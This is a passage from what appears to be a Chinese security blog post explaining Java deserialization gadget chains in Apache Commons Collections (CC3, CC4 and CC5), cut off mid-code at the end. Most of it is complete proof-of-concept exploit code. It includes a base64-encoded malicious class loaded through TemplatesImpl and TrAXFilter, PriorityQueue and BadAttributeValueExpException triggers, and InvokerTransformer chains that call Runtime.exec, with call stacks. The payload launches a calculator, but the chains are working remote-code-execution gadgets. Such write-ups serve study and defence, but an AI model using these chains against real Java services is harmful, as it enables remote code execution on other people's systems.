<p>poc 如下，这个是基于 CC1 的 <code>LazyMap</code> 链，其实这里可以自由组合其他的链，只要能调用到 <code>transform</code> 方法即可。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:64, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">transform:106, InstantiateTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy1 (com.sun.proxy)</span><br><span class="line">readObject:349, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:53, CommonsCollections3 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections4（CC2-TrAXFilter）"><a href="#CommonsCollections4（CC2-TrAXFilter）" class="headerlink" title="CommonsCollections4（CC2+TrAXFilter）"></a>CommonsCollections4（CC2+TrAXFilter）</h3><p>在 CC2 的基础上借助 <code>TrAXFilter</code>+<code>TemplatesImpl</code> 加载字节码绕过对 <code>InvokerTransformer</code> 的过滤，另外我把 <code>TrAXFilter.class</code> 存到 <code>PriorityQueue</code> 中可以避免 <code>Transformer</code> 数组。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">defineClass:<span class="number">142</span>, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:<span class="number">346</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:<span class="number">383</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">transform:<span class="number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:<span class="number">40</span>, CommonsCollections4 (com.example)</span><br></pre></td></tr></table></figure></div>
<h3 id="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"><a href="#CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）" class="headerlink" title="CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）"></a>CommonsCollections5（BadAttributeValueExpException→TiedMapEntry）</h3><p><code>javax.management.BadAttributeValueExpException</code> 在反序列化 <code>readObject</code> 时如果满足 <code>System.getSecurityManager() == null</code> 条件时会对其中的 <code>val</code> 成员调用 <code>toString</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而 <code>TiedMapEntry</code> 的 <code>toString</code> 方法最终会调用到 <code>map.get</code> 方法，正好可以与 <code>LazyMap</code> 的利用链结合。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>POC 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, entry);</span><br><span class="line">        <span 